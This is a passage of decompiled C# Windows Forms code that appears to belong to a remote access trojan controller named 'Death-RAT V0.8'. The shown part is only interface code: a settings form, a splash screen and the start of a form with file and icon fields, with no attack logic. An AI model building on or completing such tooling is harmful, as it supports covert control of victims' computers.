			Control arg_3F0_0 = this.Button2;
			location = new Point(12, 64);
			arg_3F0_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_41B_0 = this.Button2;
			size = new Size(52, 36);
			arg_41B_0.Size = size;
			this.Button2.TabIndex = 27;
			this.Button2.Text = "NO";
			this.Button2.UseVisualStyleBackColor = true;
			this.Button9.FlatStyle = FlatStyle.Flat;
			this.Button9.Font = new Font("Segoe UI", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button9.ForeColor = Color.LightSteelBlue;
			Control arg_49C_0 = this.Button9;
			location = new Point(12, 120);
			arg_49C_0.Location = location;
			this.Button9.Name = "Button9";
			Control arg_4C7_0 = this.Button9;
			size = new Size(52, 57);
			arg_4C7_0.Size = size;
			this.Button9.TabIndex = 29;
			this.Button9.Text = "BR";
			this.Button9.UseVisualStyleBackColor = true;
			this.Button8.FlatStyle = FlatStyle.Flat;
			this.Button8.Font = new Font("Palatino Linotype", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button8.ForeColor = Color.LightSteelBlue;
			Control arg_54B_0 = this.Button8;
			location = new Point(12, 172);
			arg_54B_0.Location = location;
			this.Button8.Name = "Button8";
			Control arg_576_0 = this.Button8;
			size = new Size(52, 36);
			arg_576_0.Size = size;
			this.Button8.TabIndex = 30;
			this.Button8.Text = "NO";
			this.Button8.UseVisualStyleBackColor = true;
			this.GroupBox2.Controls.Add(this.PictureBox4);
			this.GroupBox2.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.GroupBox2.ForeColor = Color.White;
			Control arg_601_0 = this.GroupBox2;
			location = new Point(70, 106);
			arg_601_0.Location = location;
			this.GroupBox2.Name = "GroupBox2";
			Control arg_62F_0 = this.GroupBox2;
			size = new Size(199, 102);
			arg_62F_0.Size = size;
			this.GroupBox2.TabIndex = 31;
			this.GroupBox2.TabStop = false;
			this.GroupBox2.Text = "Context Image";
			this.PictureBox4.BorderStyle = BorderStyle.FixedSingle;
			this.PictureBox4.ErrorImage = (Image)componentResourceManager.GetObject("PictureBox4.ErrorImage");
			this.PictureBox4.InitialImage = (Image)componentResourceManager.GetObject("PictureBox4.InitialImage");
			Control arg_6B8_0 = this.PictureBox4;
			location = new Point(6, 14);
			arg_6B8_0.Location = location;
			this.PictureBox4.Name = "PictureBox4";
			Control arg_6E6_0 = this.PictureBox4;
			size = new Size(187, 82);
			arg_6E6_0.Size = size;
			this.PictureBox4.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox4.TabIndex = 7;
			this.PictureBox4.TabStop = false;
			this.GroupBox3.Controls.Add(this.PictureBox1);
			this.GroupBox3.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.GroupBox3.ForeColor = Color.White;
			Control arg_76B_0 = this.GroupBox3;
			location = new Point(70, 3);
			arg_76B_0.Location = location;
			this.GroupBox3.Name = "GroupBox3";
			Control arg_799_0 = this.GroupBox3;
			size = new Size(199, 97);
			arg_799_0.Size = size;
			this.GroupBox3.TabIndex = 28;
			this.GroupBox3.TabStop = false;
			this.GroupBox3.Text = "Back Image";
			this.PictureBox1.BorderStyle = BorderStyle.FixedSingle;
			this.PictureBox1.ErrorImage = (Image)componentResourceManager.GetObject("PictureBox1.ErrorImage");
			this.PictureBox1.InitialImage = (Image)componentResourceManager.GetObject("PictureBox1.InitialImage");
			Control arg_822_0 = this.PictureBox1;
			location = new Point(6, 18);
			arg_822_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_850_0 = this.PictureBox1;
			size = new Size(187, 73);
			arg_850_0.Size = size;
			this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox1.TabIndex = 7;
			this.PictureBox1.TabStop = false;
			this.Button3.FlatStyle = FlatStyle.Flat;
			this.Button3.ForeColor = Color.LightSteelBlue;
			Control arg_8B1_0 = this.Button3;
			location = new Point(12, 214);
			arg_8B1_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_8DC_0 = this.Button3;
			size = new Size(86, 23);
			arg_8DC_0.Size = size;
			this.Button3.TabIndex = 35;
			this.Button3.Text = "Color ";
			this.Button3.UseVisualStyleBackColor = true;
			this.Button4.FlatStyle = FlatStyle.Flat;
			this.Button4.ForeColor = Color.LightSteelBlue;
			Control arg_942_0 = this.Button4;
			location = new Point(93, 214);
			arg_942_0.Location = location;
			this.Button4.Name = "Button4";
			Control arg_96D_0 = this.Button4;
			size = new Size(97, 23);
			arg_96D_0.Size = size;
			this.Button4.TabIndex = 36;
			this.Button4.Text = "Save";
			this.Button4.UseVisualStyleBackColor = true;
			this.CheckBox1.AutoSize = true;
			Control arg_9C2_0 = this.CheckBox1;
			location = new Point(296, 49);
			arg_9C2_0.Location = location;
			this.CheckBox1.Name = "CheckBox1";
			Control arg_9ED_0 = this.CheckBox1;
			size = new Size(79, 17);
			arg_9ED_0.Size = size;
			this.CheckBox1.TabIndex = 37;
			this.CheckBox1.Text = "CheckBox1";
			this.CheckBox1.UseVisualStyleBackColor = true;
			this.NsRadioButton1.Checked = false;
			Control arg_A42_0 = this.NsRadioButton1;
			location = new Point(406, 43);
			arg_A42_0.Location = location;
			this.NsRadioButton1.Name = "NsRadioButton1";
			Control arg_A6D_0 = this.NsRadioButton1;
			size = new Size(75, 23);
			arg_A6D_0.Size = size;
			this.NsRadioButton1.TabIndex = 38;
			this.NsRadioButton1.Text = "NsRadioButton1";
			this.GR_Check.BackColor = Color.LightSteelBlue;
			this.GR_Check.Checked = false;
			this.GR_Check.Colors = new Bloom[0];
			this.GR_Check.Customization = "";
			this.GR_Check.Font = new Font("Segoe UI", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.GR_Check.Image = null;
			Control arg_B17_0 = this.GR_Check;
			location = new Point(196, 214);
			arg_B17_0.Location = location;
			this.GR_Check.Name = "GR_Check";
			this.GR_Check.NoRounding = false;
			Control arg_B4F_0 = this.GR_Check;
			size = new Size(87, 20);
			arg_B4F_0.Size = size;
			this.GR_Check.TabIndex = 0;
			this.GR_Check.Transparent = false;
			this.NyX_Button1.Colors = new Bloom[0];
			this.NyX_Button1.Cursor = Cursors.Hand;
			this.NyX_Button1.Customization = "";
			this.NyX_Button1.Font = new Font("Arial", 8f);
			this.NyX_Button1.Image = null;
			Control arg_BE1_0 = this.NyX_Button1;
			location = new Point(360, 106);
			arg_BE1_0.Location = location;
			this.NyX_Button1.Name = "NyX_Button1";
			this.NyX_Button1.NoRounding = false;
			Control arg_C1C_0 = this.NyX_Button1;
			size = new Size(156, 27);
			arg_C1C_0.Size = size;
			this.NyX_Button1.TabIndex = 8;
			this.NyX_Button1.Text = "Information Color";
			this.NyX_Button1.Transparent = false;
			this.NyX_Button2.Colors = new Bloom[0];
			this.NyX_Button2.Cursor = Cursors.Hand;
			this.NyX_Button2.Customization = "";
			this.NyX_Button2.Font = new Font("Segoe UI", 14.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.NyX_Button2.Image = null;
			Control arg_CC2_0 = this.NyX_Button2;
			location = new Point(565, 106);
			arg_CC2_0.Location = location;
			this.NyX_Button2.Name = "NyX_Button2";
			this.NyX_Button2.NoRounding = false;
			Control arg_CFD_0 = this.NyX_Button2;
			size = new Size(294, 45);
			arg_CFD_0.Size = size;
			this.NyX_Button2.TabIndex = 34;
			this.NyX_Button2.Text = "Save and Exit";
			this.NyX_Button2.Transparent = false;
			this.LinkLabel1.AutoSize = true;
			this.LinkLabel1.LinkColor = Color.LightSteelBlue;
			Control arg_D66_0 = this.LinkLabel1;
			location = new Point(222, 214);
			arg_D66_0.Location = location;
			this.LinkLabel1.Name = "LinkLabel1";
			Control arg_D91_0 = this.LinkLabel1;
			size = new Size(47, 13);
			arg_D91_0.Size = size;
			this.LinkLabel1.TabIndex = 39;
			this.LinkLabel1.TabStop = true;
			this.LinkLabel1.Text = "Gridlines";
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(22, 22, 22);
			size = new Size(280, 239);
			this.ClientSize = size;
			this.Controls.Add(this.LinkLabel1);
			this.Controls.Add(this.NsRadioButton1);
			this.Controls.Add(this.CheckBox1);
			this.Controls.Add(this.GR_Check);
			this.Controls.Add(this.NyX_Button1);
			this.Controls.Add(this.Button4);
			this.Controls.Add(this.PictureBox2);
			this.Controls.Add(this.Button3);
			this.Controls.Add(this.NyX_Button2);
			this.Controls.Add(this.GroupBox4);
			this.Controls.Add(this.GroupBox1);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.Button2);
			this.Controls.Add(this.Button9);
			this.Controls.Add(this.Button8);
			this.Controls.Add(this.GroupBox2);
			this.Controls.Add(this.GroupBox3);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(296, 273);
			this.MaximumSize = size;
			size = new Size(296, 273);
			this.MinimumSize = size;
			this.Name = "Form3";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Setting";
			this.TransparencyKey = Color.Fuchsia;
			((ISupportInitialize)this.PictureBox2).EndInit();
			this.GroupBox2.ResumeLayout(false);
			((ISupportInitialize)this.PictureBox4).EndInit();
			this.GroupBox3.ResumeLayout(false);
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void Form3_Load(object sender, EventArgs e)
		{
			this.Text = "Setting " + Environment.MachineName + "\\@" + Environment.UserName;
			try
			{
				string empty = string.Empty;
				string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
			}
			catch (Exception expr_38)
			{
				ProjectData.SetProjectError(expr_38);
				ProjectData.ClearProjectError();
			}
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 190;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 290;
				bool @checked = this.GR_Check.Checked;
				if (@checked)
				{
					MyProject.Forms.Frm_Main.L1V.GridLines = true;
				}
				else
				{
					MyProject.Forms.Frm_Main.L1V.GridLines = false;
				}
			}
		}

		private void Button9_Click_1(object sender, EventArgs e)
		{
		}

		private void NyX_Theme1_Click(object sender, EventArgs e)
		{
		}

		private void GR_Check_CheckedChanged(object sender)
		{
		}

		private void Button8_Click_1(object sender, EventArgs e)
		{
		}

		private void NyX_Button1_Click(object sender, EventArgs e)
		{
		}

		private void NyX_Button2_Click(object sender, EventArgs e)
		{
		}

		private void OpenFileDialog2_FileOk(object sender, CancelEventArgs e)
		{
		}

		private void Button1_Click_1(object sender, EventArgs e)
		{
			bool flag = this.OpenFileDialog1.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.PictureBox1.ImageLocation = this.OpenFileDialog1.FileName;
				MyProject.Forms.Frm_Main.L1V.BackgroundImage = this.PictureBox1.Image;
			}
		}

		private void Button2_Click_1(object sender, EventArgs e)
		{
			this.PictureBox1.Image = null;
			MyProject.Forms.Frm_Main.L1V.BackgroundImage = null;
		}

		private void Button9_Click(object sender, EventArgs e)
		{
			bool flag = this.OpenFileDialog2.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.PictureBox4.ImageLocation = this.OpenFileDialog2.FileName;
				MyProject.Forms.Frm_Main.ContextMenuStrip3.BackgroundImage = this.PictureBox4.Image;
			}
		}

		private void Button8_Click(object sender, EventArgs e)
		{
			this.PictureBox4.Image = null;
			MyProject.Forms.Frm_Main.ContextMenuStrip3.BackgroundImage = null;
		}

		private void Button4_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Frm_Main.L1V.BackgroundImage = this.PictureBox1.Image;
			MyProject.Forms.Frm_Main.ContextMenuStrip3.BackgroundImage = this.PictureBox4.Image;
			this.Hide();
		}

		private void Button3_Click_1(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			bool flag = colorDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.PictureBox2.BackColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.ToStael1.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.ToStael1.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.conz.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.ToolStripStatusLabel8.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.To2.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.StatusStrip1.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.Tool1.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.ToolStripStatusLabel6.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.Tou.ForeColor = colorDialog.Color;
				MyProject.Forms.Frm_Main.L2.ForeColor = colorDialog.Color;
			}
		}

		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.GR_Check.Checked;
			if (@checked)
			{
				MyProject.Forms.Frm_Main.L1V.GridLines = true;
			}
			else
			{
				MyProject.Forms.Frm_Main.L1V.GridLines = false;
			}
		}

		private void GR_Check_CheckedChanged_1(object sender)
		{
			bool @checked = this.GR_Check.Checked;
			if (@checked)
			{
				MyProject.Forms.Frm_Main.L1V.GridLines = true;
			}
			else
			{
				MyProject.Forms.Frm_Main.L1V.GridLines = false;
			}
		}

		private void NyX_Button1_Click_1(object sender, EventArgs e)
		{
		}

		private void NsRadioButton1_CheckedChanged(object sender)
		{
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Form4 : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("NsTabControl1")]
		private NSTabControl _NsTabControl1;

		[AccessedThroughProperty("TabPage1")]
		private TabPage _TabPage1;

		[AccessedThroughProperty("TabPage2")]
		private TabPage _TabPage2;

		[AccessedThroughProperty("lbl_Title")]
		private Label _lbl_Title;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		[AccessedThroughProperty("ProgressBar2")]
		private ProgressBar _ProgressBar2;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("NyX_GroupBox1")]
		private NYX_GroupBox _NyX_GroupBox1;

		internal virtual NSTabControl NsTabControl1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NsTabControl1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NsTabControl1 = value;
			}
		}

		internal virtual TabPage TabPage1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage1 = value;
			}
		}

		internal virtual TabPage TabPage2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage2 = value;
			}
		}

		internal virtual Label lbl_Title
		{
			[DebuggerNonUserCode]
			get
			{
				return this._lbl_Title;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._lbl_Title = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		internal virtual ProgressBar ProgressBar2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar2 = value;
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual NYX_GroupBox NyX_GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_GroupBox1 = value;
			}
		}

		[DebuggerNonUserCode]
		public Form4()
		{
			base.Load += new EventHandler(this.Form4_Load);
			Form4.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form4.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Form4.__ENCList.Count == Form4.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Form4.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Form4.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Form4.__ENCList[num] = Form4.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Form4.__ENCList.RemoveRange(num, Form4.__ENCList.Count - num);
						Form4.__ENCList.Capacity = Form4.__ENCList.Count;
					}
					Form4.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form4));
			this.Label2 = new Label();
			this.Label3 = new Label();
			this.lbl_Title = new Label();
			this.Timer1 = new Timer(this.components);
			this.Timer2 = new Timer(this.components);
			this.ProgressBar2 = new ProgressBar();
			this.NsTabControl1 = new NSTabControl();
			this.TabPage1 = new TabPage();
			this.TabPage2 = new TabPage();
			this.NyX_GroupBox1 = new NYX_GroupBox();
			this.NsTabControl1.SuspendLayout();
			this.SuspendLayout();
			this.Label2.AutoSize = true;
			this.Label2.ForeColor = Color.LightSteelBlue;
			Control arg_E4_0 = this.Label2;
			Point location = new Point(34, 32);
			arg_E4_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_10F_0 = this.Label2;
			Size size = new Size(18, 13);
			arg_10F_0.Size = size;
			this.Label2.TabIndex = 112;
			this.Label2.Text = "%";
			this.Label3.AutoSize = true;
			this.Label3.BackColor = Color.Black;
			this.Label3.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label3.ForeColor = Color.LightSteelBlue;
			Control arg_194_0 = this.Label3;
			location = new Point(12, 29);
			arg_194_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_1BF_0 = this.Label3;
			size = new Size(16, 16);
			arg_1BF_0.Size = size;
			this.Label3.TabIndex = 111;
			this.Label3.Text = "1";
			this.lbl_Title.AutoSize = true;
			this.lbl_Title.BackColor = Color.Transparent;
			this.lbl_Title.Font = new Font("Impact", 21.75f, FontStyle.Bold | FontStyle.Underline, GraphicsUnit.Point, 0);
			this.lbl_Title.ForeColor = Color.Magenta;
			Control arg_244_0 = this.lbl_Title;
			location = new Point(58, 18);
			arg_244_0.Location = location;
			this.lbl_Title.Name = "lbl_Title";
			Control arg_272_0 = this.lbl_Title;
			size = new Size(201, 36);
			arg_272_0.Size = size;
			this.lbl_Title.TabIndex = 7;
			this.lbl_Title.Text = "Death-RATV0.8";
			this.Timer2.Enabled = true;
			this.ProgressBar2.Dock = DockStyle.Bottom;
			Control arg_2C2_0 = this.ProgressBar2;
			location = new Point(0, 57);
			arg_2C2_0.Location = location;
			this.ProgressBar2.Name = "ProgressBar2";
			Control arg_2F0_0 = this.ProgressBar2;
			size = new Size(298, 16);
			arg_2F0_0.Size = size;
			this.ProgressBar2.TabIndex = 105;
			this.NsTabControl1.Alignment = TabAlignment.Left;
			this.NsTabControl1.Controls.Add(this.TabPage1);
			this.NsTabControl1.Controls.Add(this.TabPage2);
			this.NsTabControl1.DrawMode = TabDrawMode.OwnerDrawFixed;
			TabControl arg_360_0 = this.NsTabControl1;
			size = new Size(28, 115);
			arg_360_0.ItemSize = size;
			Control arg_37F_0 = this.NsTabControl1;
			location = new Point(704, 163);
			arg_37F_0.Location = location;
			this.NsTabControl1.Multiline = true;
			this.NsTabControl1.Name = "NsTabControl1";
			this.NsTabControl1.SelectedIndex = 0;
			Control arg_3C4_0 = this.NsTabControl1;
			size = new Size(91, 30);
			arg_3C4_0.Size = size;
			this.NsTabControl1.SizeMode = TabSizeMode.Fixed;
			this.NsTabControl1.TabIndex = 2;
			this.TabPage1.BackColor = Color.FromArgb(50, 50, 50);
			TabPage arg_410_0 = this.TabPage1;
			location = new Point(234, 4);
			arg_410_0.Location = location;
			this.TabPage1.Name = "TabPage1";
			Control arg_438_0 = this.TabPage1;
			Padding padding = new Padding(3);
			arg_438_0.Padding = padding;
			Control arg_451_0 = this.TabPage1;
			size = new Size(0, 22);
			arg_451_0.Size = size;
			this.TabPage1.TabIndex = 0;
			this.TabPage1.Text = "TabPage1";
			this.TabPage2.BackColor = Color.FromArgb(50, 50, 50);
			TabPage arg_4A1_0 = this.TabPage2;
			location = new Point(234, 4);
			arg_4A1_0.Location = location;
			this.TabPage2.Name = "TabPage2";
			Control arg_4C9_0 = this.TabPage2;
			padding = new Padding(3);
			arg_4C9_0.Padding = padding;
			Control arg_4E2_0 = this.TabPage2;
			size = new Size(0, 22);
			arg_4E2_0.Size = size;
			this.TabPage2.TabIndex = 1;
			this.TabPage2.Text = "TabPage2";
			this.NyX_GroupBox1.Animated = true;
			this.NyX_GroupBox1.BorderStyle = FormBorderStyle.None;
			this.NyX_GroupBox1.Colors = new Bloom[0];
			this.NyX_GroupBox1.Customization = "";
			this.NyX_GroupBox1.Dock = DockStyle.Top;
			this.NyX_GroupBox1.Font = new Font("Arial", 9f);
			this.NyX_GroupBox1.Image = null;
			Control arg_589_0 = this.NyX_GroupBox1;
			location = new Point(0, 0);
			arg_589_0.Location = location;
			this.NyX_GroupBox1.Movable = true;
			this.NyX_GroupBox1.Name = "NyX_GroupBox1";
			this.NyX_GroupBox1.NoRounding = false;
			this.NyX_GroupBox1.Sizable = true;
			Control arg_5DE_0 = this.NyX_GroupBox1;
			size = new Size(298, 19);
			arg_5DE_0.Size = size;
			this.NyX_GroupBox1.SmartBounds = true;
			this.NyX_GroupBox1.StartPosition = FormStartPosition.Manual;
			this.NyX_GroupBox1.TabIndex = 113;
			this.NyX_GroupBox1.Text = "*";
			this.NyX_GroupBox1.TransparencyKey = Color.DimGray;
			this.NyX_GroupBox1.Transparent = false;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(298, 73);
			this.ClientSize = size;
			this.Controls.Add(this.NyX_GroupBox1);
			this.Controls.Add(this.Label3);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.ProgressBar2);
			this.Controls.Add(this.lbl_Title);
			this.Controls.Add(this.NsTabControl1);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Form4";
			this.Text = "Death-RAT";
			this.NsTabControl1.ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			Label label = this.Label3;
			label.Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0);
			bool flag = Conversions.ToDouble(this.Label3.Text) == 100.0;
			if (flag)
			{
				this.Hide();
				this.Timer1.Enabled = false;
				this.Hide();
			}
			this.ProgressBar2.Increment(1);
			flag = (this.ProgressBar2.Value == 4);
			if (flag)
			{
			}
			flag = (this.ProgressBar2.Value == 9);
			if (flag)
			{
			}
			flag = (this.ProgressBar2.Value == 15);
			if (flag)
			{
			}
			flag = (this.ProgressBar2.Value == 18);
			if (flag)
			{
			}
			flag = (this.ProgressBar2.Value == 30);
			if (flag)
			{
			}
			flag = (this.ProgressBar2.Value == 37);
			if (flag)
			{
			}
			flag = (this.ProgressBar2.Value == 50);
			if (flag)
			{
			}
			flag = (this.ProgressBar2.Value == 80);
			if (flag)
			{
				this.Hide();
				MyProject.Forms.Frm_Main.Show();
			}
		}

		private void Form4_Load(object sender, EventArgs e)
		{
			checked
			{
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 1;
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Height - 0;
				this.Timer1.Start();
			}
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			bool flag = this.lbl_Title.ForeColor == Color.Blue;
			if (flag)
			{
				this.lbl_Title.ForeColor = Color.DeepPink;
			}
			else
			{
				this.lbl_Title.ForeColor = Color.Blue;
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Form5 : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("NyX_GroupBox1")]
		private NYX_GroupBox _NyX_GroupBox1;

		[AccessedThroughProperty("LogInRichTextBox1")]
		private LogInRichTextBox _LogInRichTextBox1;

		[AccessedThroughProperty("LogInRichTextBox2")]
		private LogInRichTextBox _LogInRichTextBox2;

		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		[AccessedThroughProperty("Button7")]
		private Button _Button7;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("OpenFileDialog1")]
		private OpenFileDialog _OpenFileDialog1;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("Button6")]
		private Button _Button6;

		[AccessedThroughProperty("Button8")]
		private Button _Button8;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button10")]
		private Button _Button10;

		private string fichier;

		private string icone;

		internal virtual NYX_GroupBox NyX_GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_GroupBox1 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox1 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox2 = value;
			}
		}

		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				flag = (this._Button4 != null);
				if (flag)
				{
					this._Button4.Click += value2;
				}
			}
		}

		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click);
				bool flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click -= value2;
				}
				this._Button5 = value;
				flag = (this._Button5 != null);
				if (flag)
				{
					this._Button5.Click += value2;
				}
			}
		}

		internal virtual Button Button7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button7_Click);
				bool flag = this._Button7 != null;
				if (flag)
